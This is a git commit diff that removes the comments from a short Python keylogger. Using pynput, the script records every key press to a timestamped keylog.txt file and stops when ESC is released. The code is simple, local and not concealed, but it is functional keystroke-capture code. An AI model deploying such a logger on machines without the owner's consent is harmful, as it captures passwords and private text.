5aee347e2474ab1606b2de57159adddd45ede0a8
rohanhosamane <144099573+rohanhosamane@users.noreply.github.com>
2025-07-15 12:26:32 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,20 +1,19 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-# File to store keystrokes
 log_file = "keylog.txt"
 
-# Logging setup
+
 logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-# Function to log keystrokes
+
 def on_press(key):
     try:
         logging.info(f"Key pressed: {key.char}")
     except AttributeError:
         logging.info(f"Special key: {key}")
 
-# Stop logging on ESC
+
 def on_release(key):
     if key == Key.esc:
         print("Keylogger stopped.")
